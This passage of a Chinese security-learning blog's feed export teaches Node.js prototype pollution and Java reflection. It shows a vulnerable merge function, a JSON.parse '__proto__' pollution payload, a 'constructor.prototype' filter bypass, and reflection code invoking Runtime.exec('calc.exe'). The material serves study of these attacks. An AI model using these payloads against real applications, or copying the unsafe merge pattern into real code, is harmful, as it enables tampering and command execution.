<p>同样可以看到<code>foo</code>确实存在一个原型，并且为<code>Object</code>。</p>
<p>那么如果我们通过<code>foo.__proto__</code>修改原型中的某些值呢？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>这里我们通过<code>foo.__proto__</code>将<code>bar</code>值修改为2，</p>
<p>然后打印看看，</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905102214488.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905102214488.png" alt="image-20230905102214488"></a></p>
<p>突然发现，打印的结果是1，而不是我们刚才修改的结果2</p>
<p>这是为什么呢？</p>
<p>我们再次看看foo就知道了</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905102456014.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905102456014.png" alt="image-20230905102456014"></a></p>
<blockquote>
<p>我们可以看到，<code>bar: 1</code>是foo自身的属性，而原型Object中的<code>bar: 2</code>，层次要低于foo自身的属性，所以相同的属性，还是以自身优先，不存在或者不完善，才从原型中继承，这和上面讲的Son类和Father类是一样的。</p>
</blockquote>
<p>所以这里打印结果还是1，就是这个原因。</p>
<p>但是，如果我们再新建一个对象，让它和foo一样，原型也是只有<code>Object</code>，但是没有bar属性，再次打印会怎么样呢</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905102953845.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905102953845.png" alt="image-20230905102953845"></a></p>
<p>可以看到打印结果为2，因为这里zoo对象没有bar属性，所以这里zoo就直接继承Object中bar属性，而Object本身并没有bar属性，是foo通过<code>foo.__proto__</code>来新增的一个属性，却能达到影响zoo对象的作用。</p>
<blockquote>
<p>那么，这种在一个应用中，攻击者控制并修改了一个对象的原型，那么将可能影响所有和这个对象来自同一个类。父祖类的对象。这种攻击方式就是原型链攻击</p>
</blockquote>
<h1 id="哪些情况下原型链会被污染呢？"><a href="#哪些情况下原型链会被污染呢？" class="headerlink" title="哪些情况下原型链会被污染呢？"></a>哪些情况下原型链会被污染呢？</h1><p>根据上述内容，我们发现关键在于能够顺利调用<code>__proto__</code>并设置其值即可，那么如何成功呢？</p>
<blockquote>
<p>关键在于找到能够控制数字【对象】的“键名”的操作即可：</p>
<ul>
<li>对象<code>merge</code></li>
<li>对象<code>clone</code>（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
</blockquote>
<p>以对象merge为例，我们想象一个简单的merge函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个函数是一个递归函数，它的目的是将 <code>source</code> 对象中的属性合并到 <code>target</code> 对象中。它通过遍历 <code>source</code> 对象中的每一个键值对，如果 <code>target</code> 对象中也存在这个键，那么就递归调用 <code>merge</code> 函数将两个对象中对应键的值进行合并；否则，就直接将 <code>source</code> 对象中的键值对复制到 <code>target</code> 对象中。最终，<code>target</code> 对象将包含原来的属性以及 <code>source</code> 对象中的所有属性。这个函数通常用于合并两个或多个对象，以便于在一个对象中访问所有属性。</p>
</blockquote>
<p>我们看到，在合并时存在复制操作<code>target[key] = source[key]</code>，那么如果这个key是<code>__proto__</code>，是否就可以成功造成污染呢？</p>
<p>试一下，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>

<p>这里可以看到o1和o2确实是合并成功了，但是<code>o2.__proto__</code> 的b却没有合并进去，</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20240531103907131.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20240531103907131.png" alt="image-20240531103907131"></a></p>
<p>但是我们的<code>__proto__</code>不见了，取而代之发现多了个<code>Object</code>原型，也就是说我们的<code>__proto__</code>被当作o2的原型，也就是其自身的<code>Object</code>，但是并没有影响最后一个每个对象共有<code>Object</code>，</p>
<p>这里的 <code>__proto__</code> 实际上不是一个普通的属性，而是将 <code>o2</code> 的原型设置为 <code>&#123;b: 2&#125;</code>。所以 <code>o2</code> 的结构如下：</p>
<ul>
<li><code>o2.a</code> 是自身的属性，值为 <code>1</code>。</li>
<li><code>o2</code> 的原型有一个属性 <code>b</code>，值为 <code>2</code>。</li>
</ul>
<p>而merge合并只合并自身属性，所以这种污染是无效的。</p>
<p>此时遍历o2的所有键名，拿到的只有[a,b]，<code>__proto__</code>并不是一个key，自然也不无法修改Object的原型。</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905110442713.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905110442713.png" alt="image-20230905110442713"></a></p>
<p>所以当我们想用<code>o3</code>测试是否污染时，发现是没有的</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905111044306.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905111044306.png" alt="image-20230905111044306"></a></p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905111219362.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905111219362.png" alt="image-20230905111219362"></a></p>
<p>那么如何将<code>__proto__</code>被当作是一个键名呢，只要加一个解析就行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>

<p>再看看o2的数据，</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905111651534.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905111651534.png" alt="image-20230905111651534"></a></p>
<p>发现这次<code>__proto__</code>，没有被当作o2的原型了，而是一个键值</p>
<p>此时再次打印o3，发现成功污染<code>Object</code></p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905111841511.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905111841511.png" alt="image-20230905111841511"></a></p>
<blockquote>
<p>JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
</blockquote>
<p>可以是为什么能实现将属性b以及其值污染到Object中呢？</p>
<p>其实很简单，</p>
<p>我们实际修改原型时用的语法是</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">o2.<span class="property">__proto__</span>.<span class="property">b</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>而读取数组中键值也是如此语法，所以当键值为<code>__proto__</code>时，调用<code>__proto__</code>其后的数据因为语法，会被当作修改原型的值，从而实现原型链污染的作用</p>
<blockquote>
<p>ps. <code>merge</code>操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
</blockquote>
<hr>
<blockquote>
<p>最后可以做一下p神的</p>
<p>Code-Breaking 2018 Thejs</p>
<p><a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js</a></p>
</blockquote>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs(原型链污染)浅入</title>
    <url>/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/</url>
    <content><![CDATA[<p><code>狠狠污染链，狠狠的继承类</code></p>
<span id="more"></span>

<h1 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h1><blockquote>
<p>想要原型链污染，先要了解什么是原型与原型链</p>
</blockquote>
<p><code>Javascript</code>中一切皆是对象，其中对象之间是存在共同和差异的，比如对象的最终原型是<code>Object</code>是原型<code>null</code>，函数对象有<code>prototype</code>属性，但是实例对象没有。</p>
<h2 id="原型的定义"><a href="#原型的定义" class="headerlink" title="原型的定义"></a>原型的定义</h2><blockquote>
<p>JavaScript原型是一种<code>对象继承的机制</code>，它<code>允许对象共享属性和方法</code>。</p>
<p>每个对象（<code>除了null</code>）都有一个原型对象，它可以通过<code>__proto__</code>属性或<code>Object.getPrototypeOf()</code>方法来访问。</p>
<p>每个函数对象（除了箭头函数）都有一个<code>prototype</code>属性，它指向该函数作为构造函数时创建的实例对象的原型。</p>
</blockquote>
<blockquote>
<p>原型就是一个对象，它可以给其他对象提供共用的属性和方法。比如，你有一个人类的原型，它有姓名、年龄、说话等属性和方法，那么你可以用这个原型来创建很多人的对象，他们都会继承这些属性和方法。</p>
</blockquote>
<h2 id="原型链的定义"><a href="#原型链的定义" class="headerlink" title="原型链的定义"></a>原型链的定义</h2><blockquote>
<p>js 是由对象组成的，对象与对象之间存在着继承关系</p>
<p>每个对象都有一个指向它的原型的内部链接，而这个原型对象又有他自己的原型，直到 <code>null</code> 为止</p>
<p>整体看来就是多个对象层层继承，实例对象的原型链接形成了一条链，也就是 js 的原型链</p>
</blockquote>
<blockquote>
<p>原型之间也可以相互继承，比如你有一个学生类的原型，它<code>继承了人类的原型</code>，但是它还有自己的属性和方法，比如学号、学习等。那么你可以用这个学生类的原型来创建很多学生的对象，他们既会继承人类的属性和方法，也会继承学生类的属性和方法。这样就形成了一个原型链，它决定了对象之间的关系。</p>
</blockquote>
<h2 id="原型对象的定义"><a href="#原型对象的定义" class="headerlink" title="原型对象的定义"></a>原型对象的定义</h2><blockquote>
<p>原型对象是JavaScript中的一种特殊的对象，它可以被附加到其他对象或函数上，从而实现对象之间的继承和共享。原型对象本身也是一个对象，它有自己的原型，形成一个原型链。原型链在遇到<code>null</code>为原型的对象时结束。您可以通过设置或修改一个对象或函数的<code>prototype</code>属性来改变它的原型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt;<span class="comment">// 创建一个空对象</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">&gt;<span class="comment">// 设置obj的原型为另一个对象</span></span><br><span class="line">obj.<span class="property">__proto__</span> = &#123;<span class="attr">name</span>: <span class="string">&quot;Alice&quot;</span>, <span class="attr">age</span>: <span class="number">20</span>&#125;;</span><br><span class="line"><span class="comment">// 访问obj的name属性，实际上是访问它的原型的name属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">name</span>); <span class="comment">// Alice</span></span><br></pre></td></tr></table></figure>

<p>可以直接在控制台中进行</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/image-20230826164140299.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/image-20230826164140299.png" alt="image-20230826164140299"></a></p>
</blockquote>
<blockquote>
<p>在JavaScript中,声明一个函数A的同时,浏览器在内存中创建一个对象B,然后A函数默认有一个属性<code>prototype</code>指向了这个对象B,这个B就<code>是函数A的原型对象也叫函数A的原型</code>。这个对象B默认会有个属性<code>constructor</code>指向了这个函数A。</p>
<p>如下图中，函数<code>Foo</code>的<code>prototype</code>指向<code>&#123;constuctor:f&#125;</code>，而<code>&#123;constuctor:f&#125;</code>的属性<code>constuctor</code>指向函数<code>Foo</code></p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/image-20230827094453409.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/image-20230827094453409.png" alt="image-20230827094453409"></a></p>
</blockquote>
<h3 id="实例对象"><a href="#实例对象" class="headerlink" title="实例对象"></a>实例对象</h3><blockquote>
<p>我们可以通过构造函数A构建一个实例对象A，A默认会有一个属性<code>__proto__</code>指向了构造函数A的原型B。</p>
</blockquote>
<h3 id="原型对象和实例对象的关系"><a href="#原型对象和实例对象的关系" class="headerlink" title="原型对象和实例对象的关系"></a>原型对象和实例对象的关系</h3><p>如下图中，<code>foo</code>为<code>Foo</code>函数的实例化对象，<code>foo</code>的<code>__proto__</code>刚好等于<code>Foo</code>函数的原型，返回为<code>true</code></p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/image-20230827095320595.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/image-20230827095320595.png" alt="image-20230827095320595"></a></p>
<h2 id="原型链机制"><a href="#原型链机制" class="headerlink" title="原型链机制"></a>原型链机制</h2><p>概念可以看一下</p>
<blockquote>
<p>每个构造函数都有一个原型，原型都包含一个指向构造函数的指针（<code>constructor</code>），</p>
<p>而实例都包含一个指向原型的内部指针（<code>__proto__</code>）。</p>
<p>假如我们将一个构造函数的 <code>prototype</code> 属性设置为另一个类型的实例，那么该构造函数的原型对象将会指向另一个类型的原型。于是，这个新的原型对象也将包含一个指向另一个构造函数的 <code>prototype</code> 对象的内部指针（<code>__proto__</code>）。如此层层递进，就形成了一个由实例和原型构成的原型链。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHello</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello, my name is &#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Dog</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="title class_">Animal</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 Dog 的原型设置为 Animal 的实例</span></span><br><span class="line"><span class="comment">//Object.create 创建一个新的对象，这个对象的原型指向 Animal.prototype，从而实现继承。</span></span><br><span class="line"><span class="comment">//Dog.prototype = Animal.prototype;这样会出现什么问题？两者会进行共享原型对象（Dog.prototype），这样修改Dog.prototype也会修改Animal.prototype中的内容</span></span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Dog</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bark</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Woof! Woof!&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&#x27;aa&#x27;</span>);</span><br><span class="line"></span><br><span class="line">dog.<span class="title function_">sayHello</span>(); <span class="comment">// Hello, my name is aa</span></span><br><span class="line">dog.<span class="title function_">bark</span>();     <span class="comment">// Woof! Woof!</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">__proto__</span> === <span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>概念太绕了，解析一下图片</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/image-20230827100718098.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/image-20230827100718098.png" alt="	"></a></p>
<p><code>Person</code>作为构造函数，每一个构造函数都有一个原型对象<code>Person.prototype</code>，而原型对象都包含一个指向构造函数的指针[<code>constructor</code>]</p>
<p>而其中<code>person</code>作为<code>Person</code>构造函数的实例[<code>let person = new Person();</code>]，也包含一个指向原型对象的内部指针[<code>__proto__</code>]</p>
<p>于是最后这个原型链就是</p>
<blockquote>
<p><code>person -&gt; Person.protype -&gt; Object.prototype -&gt; null</code></p>
</blockquote>
<p>可以看到原型链的结尾就是null</p>
<h2 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h2><h3 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a><code>__proto__</code></h3><blockquote>
<p>constructor.prototype</p>
</blockquote>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全[反射(2)]</title>
    <url>/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/</url>
    <content><![CDATA[<blockquote>
<p>如何利用Runtime构造payload</p>
</blockquote>
<span id="more"></span>

<h1 id="Java安全-反射-2"><a href="#Java安全-反射-2" class="headerlink" title="Java安全[反射(2)]"></a>Java安全[反射(2)]</h1><p>第一篇讲到过，如果想要加载一个类，可以同<code>forName</code>进行加载，但是正常情况下我们一般用到的是<code>import</code>，所以<code>forName</code>就可以帮助攻击者加载任意类。</p>
<h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><p>对于<code>$</code>，在很多源码里看到，类名包含<code>$</code>符号，比如在<code>fastjion</code>在<code>checkAutoType</code>时候就会先将 <code>$</code>替换为<code>.</code></p>
<blockquote>
<p><a href="https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L1038">https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L1038</a></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/image-20230907120021390.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907120021390.png" alt="image-20230907120021390"></a></p>
<p>可以看到类名的<code>$</code>被替换为<code>.</code>来解析，所以<code>$</code>起的作用实际就是查找内部类。</p>
<p>写个例子，在一个普通类<code>My</code>中，写一个内部类<code>Your</code>，然后编译看看<code>output</code>文件夹会生成什么</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsideClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">My</span>&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Your</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/image-20230907122251594.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907122251594.png" alt="image-20230907122251594"></a></p>
<p>可以看到，<code>Your</code>类对应生成了一个<code>My$Your.class</code>，<code>My</code>类对应生成了一个<code>My.class</code>。</p>
<p>我们还可以试试加载这两个，看看是否有区别</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsideClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; c1 = Class.forName(<span class="string">&quot;reflect2.My$Your&quot;</span>);</span><br><span class="line">        System.out.println(c1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">My</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My类被加载&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Your</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Your类被加载&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/image-20230907124919435.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907124919435.png" alt="image-20230907124919435"></a></p>
<p>发现初始化内部类时，外部类并没有被初始化，所以在一定程度上可以将它们当作两个无关类。</p>
<p>根据上面所说，Java会将<code>$</code>当作 <code>.</code> ，那如果直接把<code>$</code>换成 <code>.</code> 的话会怎么样</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/image-20230907130041368.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907130041368.png" alt="image-20230907130041368"></a></p>
<p>发现运行报错，原因是Java编译器有自己的规则，<code>$</code>在它的规则中是外部类和内部类的分隔符，但是如果用 <code>.</code>来分割外部类和内部类就会让其分不清意图，从而报错，虽然其内部会将其当作 <code>.</code> ，但是前提还是<code>$</code>被当作内外部类分割符后处理。</p>
<h2 id="getRuntime"><a href="#getRuntime" class="headerlink" title="getRuntime"></a>getRuntime</h2><p><code>class.newInstrance()</code> 作用是调用这个类中的无参构造函数，但是经常直接在<code>payload</code>中调用<code>newIntstrance</code>时往往会报错，主要有两个原因</p>
<blockquote>
<ol>
<li>目标类没有无参构造函数</li>
<li>目标类的构造函数是私有的</li>
</ol>
</blockquote>
<p>最常遇到的情况下是，调用<code>java.lang.Runtime</code>，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Instrance</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throw</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        cls.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(cls.getDeclaredConstructor().newInstance(),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现报错中提示<code>java.lang.Runtime</code>是一个私有的类，是无法直接调用其中的方法</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/image-20230907161320123.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907161320123.png" alt="image-20230907161320123"></a></p>
<p>继续跟进这个类的内容，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/image-20230907161807768.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907161807768.png" alt="image-20230907161807768"></a></p>
<p><code>Runtime</code>确实为了安全考虑，将其的构造函数设置为私有，为了不让任何其他人实例化这个类，这里的话就无法通过<code>newInstrance</code>直接进行实例化<code>Runtime</code>，也就无法执行<code>exec</code>函数。</p>
<p>那这里就会有个问题，如果有类的构造函数是私有，那不是代表当用户想要使用这个类时，无法进行实例化，就无法使用，而正常业务中为什么会出现这种情况呢？</p>
<p>其实，这种情况叫做<code>“单例模式”</code>，是一种很常见的业务模式。</p>
<p>比如，网站的数据库连接，当连接成功后，就不需要每用一次就建立一次网站数据库连接，这样就会建立多个数据库连接，造成资源浪费。这样开发者在编写代码时就会将构造函数写出私有，并通过<code>静态方法</code>来获取这个函数。</p>
<blockquote>
<p>在第一篇中提到过，初始化时，静态方法和静态变量<code>只加载一次</code>，而创建类对象时，构造函数则会每构造一个类对象就执行一次。</p>
</blockquote>
